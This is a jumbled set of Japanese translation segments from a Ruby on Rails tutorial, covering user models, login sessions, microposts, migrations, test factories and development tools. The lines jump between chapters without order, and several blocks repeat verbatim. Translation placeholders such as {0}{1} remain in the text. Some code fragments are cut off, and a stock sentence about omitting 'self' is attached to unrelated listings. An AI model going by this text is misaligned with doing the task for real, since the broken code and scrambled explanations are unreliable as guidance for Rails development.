最初のステップとして、マイクロポストのパーシャル (リスト\ref{code:feed_item_partial}) に削除リンクを追加します。
これはリスト\ref{code:micropost_model_image_validation}で使用されていました。
そして、認証に必要なすべてのメソッドもここまでに学んであります (そうなるように本書を書いたのです)。ここでは、Active Recordが提供する\kode{User.find_by}メソッド (\ref{sec:finding_user_objects}) と、\kode{has_secure_password}が提供する\kode{authenticate}メソッド (\ref{sec:user_authentication}) を使用します。
リスト\ref{code:universal_css}のCSSの結果は図\ref{fig:sample_app_universal}で確認できます。
前述の簡潔な記法を\kode{current_user}メソッドに適用した結果をリスト\ref{code:current_user}に示します。
このコードはリスト\ref{code:header_partial}で使用されていました。もうひとつ、
ユーザーがログイン中の状態とは、セッションにユーザーが存在する、つまり\kode{current_user}が\kode{nil}でないということです。
Rails 3.0以前のバージョンでは、静的ファイルは\kode{public/}以下の次のディレクトリに置かれていました。
\kode{has_secure_password}で必要となる\kode{password_digest}属性はこれで準備できましたが、ハッシュ化されていない生のパスワードも参照できると便利です。
selfを省略した結果をリスト\ref{code:user_login_test_valid_information}に示します。
アプリケーションのコードは既に動作するようになっているので、ここでテストを実行すると \passing になるはずです。
アセットパイプラインを使うと、この「開発効率と読み込み時間のどちらを重視するか」という問題について悩む必要がなくなります。
セッションの\kode{destroy}アクションの定義とテストが完成したので、ついに3大機能である「ユーザー登録/ログイン/ログアウト」がすべて完成しました。テストスイートは \passing になるはずです。
\kode{self}キーワードを与えると、この代入によってユーザーの\kode{remember_token}属性が期待どおりに設定されます
以上の点を考慮して、有効なトークンとそれに関連するダイジェストを作成できるようにします。具体的には、最初に\kode{User.new_token}で記憶トークンを作成し、続いて\kode{User.digest}を適用した結果で記憶ダイジェストを更新します。\kode{remember}メソッドの更新結果をリスト\ref{code:user_model_remember}に示します。
selfを省略した結果をリスト\ref{code:remember_me_css}に示します。
さらに申し上げると、この種の永続的セッションを手動で確認するのは非常に面倒なので、\kode{current_user}をリファクタリングするのであれば ({1}第{2}10{/2}章{/1}で行う予定です) 同時にテストも作成しておくことが重要です。
selfを省略した結果をリスト\ref{code:persistent_sessions_test}に示します。
作成したコードをリスト\ref{code:log_out_with__close_browser}に示します
selfを省略した結果をリスト\ref{code:close_route}に示します。
これはリスト\ref{code:_close_browser}で使用されていました。
これはリスト\ref{code:close_route}で使用されていました。
最後に、{0}{1}第10章{/1}{/0}でメールアドレスを使ってアカウントを有効化する方法と、パスワードをリセットする方法について学びます。
まとめると、{0}{1}第6章{/1}{/0}から{2}{1}第10章{/1}{/2}を通して、Railsのログインと認証システムをひととおり開発します。
(最初の行はmasterブランチから作業を始めることを確認するためのものです。そして、\kode{modeling-users}トピックブランチは\kode{master}ブランチを基に作成します。
メールアドレスをユーザー名にしたことで、ユーザー同士で通信できるように拡張できる可能性が開かれます ({0}{1}第10章{/1}{/0})。
マイグレーション自体は、データベースに与える変更を定義した\kode{change}メソッドの集まりです。
そのブロックの中で\kode{create_table}メソッドは\kode{t}オブジェクトを使って、\kode{name}と\kode{email}カラムをデータベースに作ります。型はどちらも\kode{string}です
ブロックの最後の行\kode{t.timestamps}は特別なコマンドで、\kode{created_at}と\kode{updated_at}という2つの「\emph{マジックカラム}」を作成します。これらは、あるユーザーが作成または更新されたときに、その時刻を自動的に記録するタイムスタンプです
もちろん、この継承の知識は、\kode{ActiveRecord::Base}に含まれるメソッドなどについて知らなければ何の役にも立ちません。それらの知識の一部についてこれから説明します。
しかし例外が重要なものであることも確かなので、\ref{sec:comments_for_various_readers}で推薦したRuby本で例外について詳しく学ぶことをおすすめします
=> [#<User id: 1, name: "Michael Hartl", email: "mhartl@example.com",
\kode{user.save}を実行したことでユーザーが更新できました。\ref{sec:creating_user_objects}で約束したように、マジックカラムの更新日時も更新されています。
属性を更新するもうひとつの方法は、\kode{update_attributes}を使うものです。
特定の属性のみを更新する必要がある場合は、以下のように\kode{update_attribute}を単発で使用して制限を回避する必要があります。
なお、\kode{created_at}カラムは、\ref{sec:ordering_and_dependency}や\ref{sec:augmenting_the_user_show_page}の実装を進めていく上で必要なカラムです。
  end
一度正しい関連付けを定義してしまえば、\kode{@micropost}変数の\kode{user_id}には、関連するユーザのidが自動的に設定されます。
データベースからユーザーのマイクロポストを読み出す\kode{user.microposts}メソッドは、デフォルトでは読み出しの順序に対して何も保証しませんが、 ブログやTwitterの慣習に従って、作成時間の逆順、つまり最も新しいマイクロポストを最初に表示するようにしてみましょう。
これでテストにパスするはずです。
このコレクションを作るために、以下のコンソールセッションに示したような、文字列の配列を簡単に作れる\kode{%w[]}という便利なテクニックを知っておくと良いでしょう。
上のコードの中にある以下の\kode{dependent: :destroy}オプションは、
ユーザー自体が破棄されたときに、そのユーザーに依存するマイクロポスト (つまり特定のユーザーのもの) も破棄されることを指定しています。
\kode{paginate}メソッドの素晴らしさに注目してください。マイクロポストの関連付けを経由して\texttt{micropost}テーブルに到達し、必要なマイクロポストのページを引き出してくれます。
代わりに、特定\kode{user_id}に対するマイクロポストの数をデータベースに問い合わせます。
それでもcountメソッドがアプリケーションのボトルネックになるようなことがあれば、さらに高速な\href{http://railscasts.com/episodes/23-counter-cache-column}{\emph{counter cache}}を使うこともできます。
\ref{sec:augmenting_the_user_show_page}のユーザーマイクロポストのテンプレート作成作業の成果は、何とも拍子抜けでした。
一意性の警告
この問題を避けるために、今回は「データベースに保存される直前にすべての文字列を小文字に変換する」という対策を採ります。例えば“Foo@ExAMPle.CoM”という文字列が与えられたら、保存する直前に“foo@example.com”に変換してしまいます。
他にどんなコールバックがあるのか知りたい場合は、\href{http://api.rubyonrails.org/v4.1.5/classes/ActiveRecord/Callbacks.html}{Rails APIのコールバック} (英語) を読んでみてください。
(本チュートリアルで初めて紹介したテクニックですが、このテクニックについては第10章でもう一度取り上げます。そこではコールバックを定義するときに{0}メソッドを参照する{/0}という慣習について説明します。){1}\emph{}{/1}
置き換えた結果を{0}{1}リスト4.3{/1}{/0}に示します。
  end
次に、マイクロポストの\kode{create}アクションを作り始めましょう。このアクションも、リスト\ref{code:user_create_action}のユーザー用アクションと似ています。違いは、新しいマイクロポストを\kode{build}するためにuser/micropost関連付けを使用している点です (リスト\ref{code:microposts_create_action})。
\kode{micropost_params}でStrong Parametersを使用していることにより、マイクロポストのコンテンツだけがWeb経由で編集可能になっていることに注目してください。
{0}図6.5{/0}{1}Userモデルに\kode{password_digest}属性を追加する。{/1}
マイグレーション名は自由に指定できますが、上のように末尾を\kode{to_users}にしておくことをお勧めします。こうしておくと、\kode{users}テーブルにカラムを追加するマイグレーションがRailsによって自動的に作成されるからです。
  else
リスト{p0}で{2}users{/2}テーブルを最初に生成するとき、{2}name:string{/2}や{2}email:string{/2}といった引数を与えていたことを思い出してください。
そのときと同様に\kode{password_digest:string}という引数を与えることで、完全なマイグレーションを生成するための十分な情報をRailsに与えることができます (リスト\ref{code:password_migration})。
    This is the home page for the
    sample application.
サンプルアプリケーションでbcryptを使用するために、\kode{bcrypt-ruby} gemを\kode{Gemfile}に追加します (リスト\ref{code:bcrypt_ruby})。
\kode{bcrypt-ruby}を\kode{Gemfile}に追加する。
<span>
\kode{f.object}は\kode{@micropost}となります。
パーシャルにオブジェクトを渡すために、値がオブジェクトで、キーがパーシャルでの変数名と同じハッシュを利用します。これで、以下のコードが完成します。
言い換えると、\kode{object: f.object}は\kode{error_messages}パーシャルの中で\kode{object}という変数名を作成します。
selfを省略した結果をリスト\ref{code:updated_error_messages_partial}に示します。
また、Userモデルに\kode{has_secure_password}を追加した効果についても (たとえば\kode{authenticate}メソッドの効果なども) 具体的に見ていきます。
\href{http://guides.rubyonrails.org/active_record_querying.html}{where}やlikeの詳細については、Rails Guideの「\kode{Active Record Query Interface{}/} (英語)」を参照してください。
\kode{has_secure_password}メソッドを使うことで、モデルに対してセキュアなパスワードを追加することができる
残念ですが、この場合はページ分割されたフィードを返してもうまく動きません。
動かない理由を確認したい方は、実際に実装してページネーションリンクをクリックしてみてください。
このコードはリスト\ref{code:micropost_partial_with_delete}で使用されていました。もうひとつ、
\kode{correct_user} before_actionでは、マイクロポストを以下のように関連付けを\emph{経由して}見つけていることに注目してください。
これはリスト\ref{code:a_test_for_invalid_submission}で使用されていました。
置き換えた結果を{0}{1}リスト4.3{/1}{/0}に示します。
selfを省略した結果をリスト\ref{code:micropost_create_image_upload}に示します。
selfを省略した結果をリスト\ref{code:micropost_partial_image_display}に示します。
これはリスト\ref{code:micropost_model_image}で使用されていました。
selfを省略した結果をリスト\ref{code:micropost_model_image_validation}に示します。
selfを省略した結果をリスト\ref{code:carrier_wave_configuration}に示します。
この世には10種類の人々がいます。3項演算子を好きな人、嫌いな人、3項演算子を知らない人です。
  if boolean?
  論理値? ?
また、3項演算子で代入文を置き換えることもできます。
  var = boolean? ?
他に、関数の戻り値で使用することもよくあります。
  def foo
    do_stuff
    boolean? ?
Rubyは暗黙的に関数の最後の式の値を返すので、ここでは\texttt{foo}メソッドは\texttt{boolean?}の値によって\texttt{"bar"}または\texttt{"baz"}を返します。
長い単語をラップさせるヘルパー。
selfを省略した結果をリスト\ref{code:edit_tests_logged_in}に示します。
これはリスト\ref{code:edit_update_wrong_user_tests}で使用されていました。
さらにありがたいことに、base64はURLを安全にエスケープするためにも用いられる (\kode{urlsafe_base64}という名前のメソッドがあることからもわかります) ので、base64を採用すれば、{1}第{2}10{/2}章{/1}でアカウントの有効化のリンクやパスワードリセットのリンクでも同じトークンジェネレータを使用できるようになります。
なお、必要なgemはここまでですべてインストールしたので、今後の章では新たなgemは追加しません。
{0}{1}第10章{/1}{/0}では、 メールアドレスが\emph{本当に}有効であることを確かめるために、\emph{アカウントを有効化する}機能をサインアップの手順に追加します。
このコードはリスト\ref{code:user_pages_spec}で使用されていました。もうひとつ、
これはリスト\ref{code:initial_signup_test}で使用されていました。
最初に行ったUserページspecの再現。
# ユーザー変数を作成するためのコードに置き換える。
これよりコメントの部分に適切なコードを追加します。
これにより、ページのコンテンツとタイトルの両方にユーザーの名前が含まれているかどうかをテストできます。
必要なUserモデルオブジェクトを作成するために、Active Recordを使用して\kode{User.create}という形式でユーザーを作成することもできますが、経験上、ユーザーのオブジェクトを定義してそれをデータベースに挿入するには、ユーザーの\emph{ファクトリー (factory)} を使用する方がはるかに便利です。
ここでは、\href{http://github.com/thoughtbot/factory_girl}{Factory Girl}を使用して生成したファクトリーを使用します。Factory Girlは、\href{http://thoughtbot.com/}{thoughtbot}のメンバーが作成したRuby gemです。
Factory Girlは、RSpecを使用してRubyで「ドメイン特化言語 (domain-specific language)」を定義します。ここでは、Active Recordのオブジェクトの定義に特化しています。
このドメイン特化言語の文法はシンプルで、必要なオブジェクトの属性を定義するためにRubyのブロックとカスタムメソッドを使用しています。
この章のサンプルアプリケーションでは、Active Recordのメリットはまだはっきりとはわからないかもしれませんが、この後の章ではファクトリーの機能をさらに活用する予定です。
(Factory Girlはテスト環境でしか使用しないので、以下のように\kode{:test}グループに追加します)。
\kode{Gemfile}にFactory Girlを追加する。
これはリスト\ref{code:user_factory}で使用されていました。
Userモデルオブジェクトをシミュレートするためのファクトリー。
シンボル\kode{:user}が\kode{factory}コマンドに渡されると、Factory Girlはそれに続く定義がUserモデルオブジェクトを対象としていることを認識します。
これはリスト\ref{code:user_show_page_test}で使用されていました。
この時点で以下を実行すると、テストスイートが赤色 (失敗) になるはずです。
これはリスト\ref{code:name_title_and_heading}で使用されていました。
ユーザーのプロファイルページにタイトルと見出しを追加する。
{0}{1}第10章{/1}{/0}では、 メールアドレスが\emph{本当に}有効であることを確かめるために、\emph{アカウントを有効化する}機能をサインアップの手順に追加します。
ただし、今はまだ\kode{app/views/shared}といったディレクトリは作っていないので、表\ref{table:unix_command_line}で紹介した\kode{mkdir}コマンドを使い、新しくディレクトリを作成する必要があります。
フォーム送信をテストするためには、 \texttt{users_path}に対して\kode{POST}リクエストを送信する必要があります (表\ref{table:table-RESTful_users})。これは、次のように\texttt{post}関数を使って実現できます
{0}{1}第10章{/1}{/0}では、 メールアドレスが\emph{本当に}有効であることを確かめるために、\emph{アカウントを有効化する}機能をサインアップの手順に追加します。
このコードはリスト\ref{code:user_pages_spec}で使用されていました。もうひとつ、
これはリスト\ref{code:initial_signup_test}で使用されていました。
最初に行ったUserページspecの再現。
# ユーザー変数を作成するためのコードに置き換える。
これよりコメントの部分に適切なコードを追加します。
これにより、ページのコンテンツとタイトルの両方にユーザーの名前が含まれているかどうかをテストできます。
必要なUserモデルオブジェクトを作成するために、Active Recordを使用して\kode{User.create}という形式でユーザーを作成することもできますが、経験上、ユーザーのオブジェクトを定義してそれをデータベースに挿入するには、ユーザーの\emph{ファクトリー (factory)} を使用する方がはるかに便利です。
ここでは、\href{http://github.com/thoughtbot/factory_girl}{Factory Girl}を使用して生成したファクトリーを使用します。Factory Girlは、\href{http://thoughtbot.com/}{thoughtbot}のメンバーが作成したRuby gemです。
Factory Girlは、RSpecを使用してRubyで「ドメイン特化言語 (domain-specific language)」を定義します。ここでは、Active Recordのオブジェクトの定義に特化しています。
このドメイン特化言語の文法はシンプルで、必要なオブジェクトの属性を定義するためにRubyのブロックとカスタムメソッドを使用しています。
この章のサンプルアプリケーションでは、Active Recordのメリットはまだはっきりとはわからないかもしれませんが、この後の章ではファクトリーの機能をさらに活用する予定です。
(Factory Girlはテスト環境でしか使用しないので、以下のように\kode{:test}グループに追加します)。
\kode{Gemfile}にFactory Girlを追加する。
これはリスト\ref{code:user_factory}で使用されていました。
Userモデルオブジェクトをシミュレートするためのファクトリー。
シンボル\kode{:user}が\kode{factory}コマンドに渡されると、Factory Girlはそれに続く定義がUserモデルオブジェクトを対象としていることを認識します。
これはリスト\ref{code:user_show_page_test}で使用されていました。
この時点で以下を実行すると、テストスイートが赤色 (失敗) になるはずです。
これはリスト\ref{code:name_title_and_heading}で使用されていました。
ユーザーのプロファイルページにタイトルと見出しを追加する。
このとき、URLが\texttt{https://}に変わっていて、アドレスバーに鍵アイコンが表示されていることにも注目してください (図\ref{fig:signup_failure_mockup})。これは先ほど設定したSSLがうまく動いていることを示しています。
最後に、認可 (authorization) のためのメソッドをアクションに追加し、Webサイトがセキュリティモデルに従うようにします。
ところで、サンプルアプリケーションをHerokuに本番展開した場合は、\texttt{heroku}コマンドで環境を確認することができます。これを行うには、Herokuの (リモート) コンソールで以下を実行します。
  Ruby console for yourapp.herokuapp.com
Gravatarは無料のサービスで、プロファイル写真をアップロードして、指定したメールアドレスと関連付けることができます。
アプリケーションでカスタム画像を扱ったりその他のファイルをアップロードする必要があれば、代わりに\href{https://github.com/thoughtbot/paperclip}{Paperclip} gemか\href{https://github.com/jnicklas/carrierwave}{CarrierWave} gemをお勧めします。
どうにも気持ちの悪い動作だと思いませんか。私にも何故必要なのか分かりません。
\href{http://www.railstutorial.org/ruby-on-rails-tutorial-book}{\emph{Ruby on Railsチュートリアル}}へようこそ。
本書は「\href{http://rubyonrails.org/}{Ruby on Rails} を使ったWeb開発を学びたいのだけど、何から始めれば良いでしょうか？」といった質問に答えるために作成されました。
\emph{本書}を読み終わる頃には、自分の手でWebアプリケーションを開発するための技術のみならず、デプロイ(deploy: 本番環境でアプリを動かし、一般公開すること)を行なうための技術もすべて習得できます。
また、Rails の教育エコシステムに存在する、さらに高度な内容の本やブログ、スクリーンキャストなどを読み解く力も身につけられるでしょう。
\emph{Ruby on Railsチュートリアル}は最新のRails 4を使用していますので、Web開発の最前線を本書で学ぶことができます。
(\emph{注}: 今皆様が読んでいるこのチュートリアルは、Rails 4.0という\emph{バージョン}に対応しています。本書はRails 3.2からRail 4.0へのバージョンアップにともなって改定されましたが、チュートリアルとしての\emph{版(エディション)}は更新されていないことに注意してください。Rails 4.0に対応するために行った変更の量がわずかで、本書の版を改めるには及ばないと判断したためです。
本書はWeb開発へといざなう「チュートリアル」に徹しており、Railsの高度な内容にまでは踏み込んでいません。以前のRails 3.2対応版と今回のRails4.0対応版との差分が少ないのは、このような理由によるものです。
今後Railsで重要な変更が生じることがあれば、\emph{Railsチュートリアル}の版を改訂するつもりです。新しい版では、\emph{Turbolinks}、\emph{Russian doll caching}、RSpec の新機能「\emph{feature specs}」などについても取り上げる予定です。)
第2版との違いについて
\emph{Ruby on Railsチュートリアル}の第2版と本書のバージョンとの違いを、この後のリストに示します
(この中で重要な変更はStrong Parametersだけであり、それ以外の変更はさほど重要ではありません)。
このリストでは、Rails 3.2向けの第2版を既に読み終わった方のために、変更された箇所だけをまとめました。
なお、次のリストには、変更を加えた節またはコードへのリンクが追加してあります。
本書の目的は、単にRailsを学ぶことでは\emph{ではなく}、Railsを例にとって広い意味での\emph{Webアプリケーション開発}そのものを学ぶことにあります。つまり、Railsに限らず、World Wide Web上で動くソフトウェアを開発したり改良したりするための技術を習得することを目指します。
この目的を達成するため、\emph{Ruby on Rails チュートリアル}では、統合的なアプローチを採用しています。つまり、「実際に動くサンプルアプリケーションをゼロから開発する」という例題をこなすことによって、Railsについて総合的に学ぶのです。
次に\kode{first_app}という最初の Rails アプリの作成に着手します。
{0}{1}第2章{/1}{/0}では、Railsアプリケーションの基本的な仕組みを体験するために、別のプロジェクトを作成します。
第3章以降では、１つの大きな\emph{サンプルアプリケーション} (\kode{sample_app}) を開発していきます。また、コードを自動生成するのではなく、ゼロからコードを書いていきます。
最終的なサンプルアプリケーションは、(偶然にも、かつてはRailsで実装されていた) \href{http://twitter.com/}{某ソーシャルマイクロブログサイト}にとてもよく似た仕上がりになります。
なお、\emph{Rails チュートリアル}では、サンプルアプリケーションの開発を中心にして話が進められていきますが、(サンプルアプリケーションに特化した技術ではなく) Web アプリケーションの開発で必要になる一般的な技術を重点的に解説していきます。このため、本書を読み終わる事には、あなたが今後どんな Web アプリケーションを開発したいのかに関わらず、どんな開発にも通用する基礎的な力を身につけることができます。
ただし、気をつけなくてはならない点が１つあります。それは、これらの動画では「15分でブログを作る」といった離れ業を、\emph{scaffold} という機能を利用して成し遂げている点です。このため、15分で作られた機能は、Railsの\kode{generate}コマンドによって (まるで魔法のように) \emph{自動生成されたコード}に強く依存しています。
Ruby on Rails は2004年にデビューして以来、急速に成長していきました。現在では、動的な Web アプリケーションを開発するフレームワークとして、最も有力かつ人気のあるフレームワークの１つになっています。
他にも、\href{http://entp.com/}{ENTP} や \href{http://thoughtbot.com/}{thoughtbot}、\href{http://pivotallabs.com/}{Pivotal Labs}、\href{http://hashrocket.com/}{Hashrocket} といった、Rails を専門的に扱う会社も数多くあります。また、Rails を専門にしたフリーランスのコンサルタントやインストラクター、開発者については、数え切るのが難しいほどです。
\emph{Rails チュートリアル}は、統合的なチュートリアルになっています。本チュートリアルは Rails を中心に構成されていますが、他にも、Ruby 言語や RSpec を使ったテスト、\href{http://en.wikipedia.org/wiki/HTML}{HTML}、\href{http://en.wikipedia.org/wiki/CSS}{CSS}、そして、わずかな \href{http://en.wikipedia.org/wiki/JavaScript}{JavaScript} と \href{http://en.wikipedia.org/wiki/SQL}{SQL} のチュートリアルも含まれています。このような統合的なチュートリアルになっているため、現時点の Web 開発の知識量に関わらず、このチュートリアルを読み終える頃には、あなたは上述した各トピックを卒なくこなせるようになるだけではなく、より高度な情報源を難なく読みこなす実力がつくようになります。
Web開発を最初から体系的に学びたい場合や、プログラミングの経験が全くない場合は、Rubyを最初に学ぶのがよいでしょう。Rubyを学ぶのであれば、Peter Cooperの「\href{http://www.amazon.com/gp/product/1430223634}{\emph{Beginning Ruby}}」がお勧めです。
これからRailsで開発を始めようとする人は「とにかく\emph{Webアプリケーション}を作りたい！」と考えていることがほとんどなので、たった1つのWebページを作成するために500ページものRuby本を読み通す気にはなれないでしょう。
「はじめに」で述べたように、\emph{Railsチュートリアル}では最初からテスト駆動開発 (TDD) を採用しています。その理由は、著者の開発経験に基づき、テスト駆動開発こそがRailsアプリケーションの開発に最も適切な手法だと考えられるからです。ただし、テスト駆動開発を全面的に採用したことにより、本チュートリアルはその分複雑になり、読者の負担も増えています。Railsのコードだけでなく、テストコードも書かなくていけないからです。
"About"
具体的には、\emph{spec} と呼ばれるテストファイルを作成し、そのファイルに、\emph{本書で指示された通りに}テストコードをコピー＆ペーストしてください。
本書を読み終える頃には、本書を読む前の知識量の多少にかかわらず、より高度なRailsの情報源を理解できるようになっているはずです。
\href{http://railscasts.com/}{RailsCasts} (Ryan Bates) : 極めて質の高い (ほぼ) 無料のスクリーンキャスト
\href{http://mbsy.co/6VQ8l}{Code School}: プログラミングを対話的に学習できるコース
\href{http://guides.rubyonrails.org/}{Rails Guides}: トピック毎に分類された最新の Rails リファレンス
なお、Windows のコマンドラインでは、$の代わりに大なり記号 (\kode{>}) がプロンプトに表示されるので、$ を > に置き換えて読んでください。
C:\Sites> echo "hello, world"
また、Unixシステム上では、いくつかのコマンドを入力する際に\kode{sudo}コマンド (他のユーザーの権限でプログラムを実行するためのコマンド) を使わなければならない場合があります
Railsには、コマンドラインで実行できるコマンドが多数付属しています。
サンプルアプリケーションの場所は、たとえば次のように表記されます。
/Users/mhartl/rails_projects/sample_app
Railsで作成するWebアプリケーションが置かれているディレクトリのルート (root) を、\emph{Railsルート}と呼ぶことにします。この用語は誤解されやすいようで、多くの人がRailsルートを「Railsというアプリケーションそのものがインストールされているディレクトリのルート」だと勘違いします。
/Users/mhartl/rails_projects/sample_app/config
/Users/mhartl/rails_projects/sample_app/config/routes.rb
システムの状態によっては、一部のコマンドを実行した時にエラーが発生することもあります。本書では、あらゆる場合を想定してエラー対策を事細かに記載するような\href{http://en.wikipedia.org/wiki/Sisyphus}{報われることのない苦労}を背負い込むことはやめました。代わりに、エラーメッセージを素直にGoogleで検索してください。これは実際のソフトウェア開発においても効果的なテクニックです。
=> {:success=>"It worked!", error: "It failed."}
本書のチュートリアルを進めていくうちに何か問題が生じたら、\href{http://railstutorial.org/help}{RailsチュートリアルのHelpページ}を読んでみてください。このページには問題を解決するためのリソースやヒントが記載されているので、問題を解決する手掛かりになるはずです
本書の第1章は、さしずめロースクールで言うところの「淘汰期間」(訳注: そこで生き残れるかどうかを選別する期間) のようなものである。本章で開発環境の構築に成功できた人ならば、最後までやり通すことは難しくありません。
 —Bob Cavezza (\emph{Rails チュートリアル}読者)
それでは、Ruby on Railsの開発環境を構築し、最初のアプリを作成してみましょう。
プログラミング経験のない方は多少苦労することもあると思いますが、どうか諦めずに頑張ってください。
苦労するのは自分だけではありません。これはどんな開発者でも幾度となく通過する道です。ここでの苦労はいつか必ず報われることは、著者が保証いたします。
開発環境はRailsプログラマ一人ひとりすべて異なります。開発者は慣れてくるに従い、自分の環境を徹底的にカスタマイズするものだからです。開発環境を大別すると、テキストエディタやコマンドラインを使う環境と、IDE (統合開発環境) の2つに分けられます。
まずは後者から見てみましょう。
Rails 用IDEとして最も有名なのは\href{http://www.aptana.com/rails/}{RadRails}と\href{http://www.jetbrains.com/ruby/index.html}{RubyMine}です。
中でもRubyMineが良いという評判をよく聞きます。本書の読者の一人 (David Loeffler) は、\href{https://github.com/perfectionist/sample_project/wiki}{RailsチュートリアルでRubyMineを使用する方法}{p1} というドキュメントまで作ってくれました。
IDE での開発が好みという方は、先ほど挙げたリンクをチェックしてみて、自分のスタイルに合うかどうか試しに使ってみるとよいでしょう。
テキストエディタとコマンドライン
Calvinは2番目のユーザーThomas Hobbes (図\ref{fig:page_flow_other_profile_follow_button_mockup}) を表示し、[Follow] ボタンを押してフォローします。
ツールの組み合わせは各人の好みやプラットフォームによって変わってきますが、著者がお勧めするツールを以下にごしょうかいしまs
本書執筆時点では、\href{http://www.sublimetext.com/3}{Sublime Text 3}はベータ版どまりです。
最新のSublime Textは、新しもの好きの方以外にはお勧めしません。
{0}図11.1{/0}{1}現在のユーザーのプロファイル。\href{http://railstutorial.org/images/figures/page_flow_profile_mockup_bootstrap-full.png}{(拡大)}{/1}
Sublime Textは\href{http://macromates.com}{TextMate}の影響を強く受けています。実際、スニペットやカラースキームなどの設定はTextMateと互換性があります。
{0}図11.2{/0}{1}フォローする相手を見つける。\href{http://railstutorial.org/images/figures/page_flow_user_index_mockup_bootstrap-full.png}{(拡大)}{/1}
（TextMateはMac OS X版しかありませんが、MacユーザーにとってはTextMateは現在でも良い選択であると言えます。)
{0}図11.3{/0}{1}フォローするユーザーのプロファイルに [Follow] ボタンが表示されている。\href{http://railstutorial.org/images/figures/page_flow_other_profile_follow_button_mockup_bootstrap-full.png}{(拡大)}{/1}
viは、Unixで古くから使用されているコマンドベースの強力なエディタです。Vimは "vi improved" の略です。
Vim は無償で手に入りますが、Sublime Text は有償です (訳注: ただし、無料の試用期間に制限はありません)。どちらもプロの開発者が使っているエディタですが、私の経験では、Sublime Text の方が初心者にとって\emph{はるかに}扱いやすいエディタだと言えます。
{0}図11.4{/0}{1}プロファイルに [Unfollow] ボタンが表示され、フォロワーのカウントが1つ増えた。\href{http://railstutorial.org/images/figures/page_flow_other_profile_unfollow_button_mockup_bootstrap-full.png}{(拡大)}{/1}
Linux の場合、デフォルトのターミナルで問題ありません。
{0}図11.5{/0}{1}Homeページにステータスフィードが表示され、フォローのカウントが1増えた。\href{http://railstutorial.org/images/figures/page_flow_home_page_feed_mockup_bootstrap-full.png}{(拡大)}{/1}
Windowsの場合、Linuxが動作する仮想マシンを用意して、その仮想マシン上でRailsアプリケーションを開発することが好まれています。この場合、お勧めのコマンドラインは上記と変わりません。
なお、Sublime Text を選んだ方の中のために、より高度な設定方法を解説した \href{https://github.com/mhartl/rails_tutorial_sublime_text}{Railsチュートリアル: Sublime Text}{p1} を用意しました。
この後で説明しますが、この方法ではたちまち壁に突き当たってしまいます。これを解決するための\kode{has_many through} (多対多の関係を表すのに使用) についてもこの後で説明します。
ただしエディタのカスタマイズは何かと厄介でエラーも起きやすいので、この解説はあくまで上級者向けです。Sublime Textは、デフォルト設定のままでもRailsアプリケーションのエディタとして十分に機能します。
{0}図1.1{/0} {1}テキストエディタ/コマンドライン開発環境 (TextMate/ ITERMを使用) \href{http://railstutorial.org/images/figures/editor_shell-full.png}{(拡大)}{/1}
ウェブブラウザの種類は豊富ですが、大半の Rails 開発者は Firefox や Safari、あるいは Chrome を使います。
これらの3つのブラウザには、ページの任意の部分を右クリック (またはControlキーを押しながらクリック) して、要素を表示する機能 (Inspect element機能) が標準で組み込まれています。
使用するツールについて
followedに代えて\emph{following}とすれば、followingsのように複数形にも対応できるのではないでしょうか。しかし今度は意味が曖昧になってしまいます。この文脈で “following” と書くと、英語では\emph{あなたを}フォローする人々の集合、つまりあなたのフォロワーを指します。これでは意味が正反対になってしまいます。
開発環境をあれこれ整え始めると、「すべてのツールを自在に使いこなすには\emph{かなり}長い時間がかかりそうだ」と実感することでしょう。
“following”は表示で “50 following, 75 followers” のように使用することはありますが、データモデルとしては違う名前を使用することにしましょう。ここでは、フォローしているユーザーたち自体を表すのに “followed users” を採用することにし、これに\kode{user.followed_users}配列が対応します
実際、テキストエディタやIDEを使いこなせるようになるまでには相当な時間が必要になります。たとえばSublime TextやVimにも専用のチュートリアルがあり、このようなチュートリアルを読み終えるだけでも数週間かかります。
本書の最初の版では\kode{user.following}としていましたが、結局これも混乱を招くことに気付きました。
開発の経験がない方にとっては相当な驚きだと思いますが、仕事の道具である\emph{開発ツールの学習に時間をかけることはいたって普通の事}であり、
私にこの用語を変更する決心をさせてくれ、よりわかりやすいアドバイスを提供してくれた読者、Cosmo Leeに感謝いたします
開発者であれば誰もが通る道です。
「良いアイディアが浮かんだから、\emph{ただ Rails で Web アプリを作りたいだけ}なのに、奇妙で古くさい Unix のエディタの使い方を覚えるだけで1週間もかかってる！」とイライラする事もあるでしょう。
(なお、彼のアドバイスをそのまま採用したわけではありませんので、もし本書にまだわかりにくい部分があったとしても、彼には一切の責任がないことをここに申し伝えておきます) 。
実質的に世界中のあらゆるソフトウェアは、壊れているか使いにくいかのどちらかだ。
Userモデルとユーザー登録機能の開発が終わったので、今度はこのサンプルアプリケーションを本番 (production) 環境に展開しましょう
\kode{user.followed_users}はユーザーの配列でなければならないため、\kode{followed_users}テーブルのそれぞれの行は、\kode{followed_id}で識別可能なユーザーである必要があります。この行には\kode{follower_id}もあり、これで関連付けを行います
人々がソフトウェアに恐怖心を抱くのは、結局これが原因なのだ。
人々は何かインストールしようとしたりオンラインフォームに記入したりするたびに、それらがさっぱり動かないという事態にすっかり慣らされてしまっている。
さらに、それぞれの行はユーザーなので、これらのユーザーに名前やパスワードなどの属性も追加する必要があるでしょう。
 —「\emph{Founders at Work}」(Jessica Livingston著) のPaul Grahamの言葉。
それでは、RubyとRailsをインストールしましょう。
本書では可能な限り多くの環境をカバーするようにしていますが、システムが変われば手順がうまくいかないこともあります。
問題が生じた場合は、エラーメッセージをGoogleで検索するか、\href{http://railstutorial.org/help}{RailsチュートリアルのHelpページ}を参照してください。
展開されたアプリケーションが期待どおりに動作するために、SSLが本番環境で動作するための行を1つ追加します。
Railsのインストール
正しい抽象化の方法を見つけ出す方法の1つは、Webアプリケーションにおける\emph{following}の動作をどのように実装するかをじっくり考えることです。
なお、特に断りのない限り、Railsを含むすべてのソフトウェアはチュートリアルで使用されているものと同じバージョンを使用してください。そうでないと同じ結果を得られないことがあります。
バージョンが少々異なっていても同じ結果を得られることもありますが、特にRailsのバージョンに関しては必ず指定を守ってください。
これはリスト\ref{code:ssl_in_production}で使用されていました。
なお、Ruby自身のバージョンは例外的にバージョンにそれほど厳しくありません。本チュートリアル内では、Ruby 1.9.3とRuby 2.0.0は実質的に同じように動作するため、どちらを使ってもチュートリアルには影響しません。お好きな方をご使用ください。
Railsインストーラ (Windows)
つまり、1人のユーザーは「\kode{has_many :relationships}」、つまり1対多の関係を持つことができ、さらにユーザーはリレーションシップ\emph{を経由して}多くの\kode{followed_users} (または\kode{followers}) と関係を持つことができるということです。
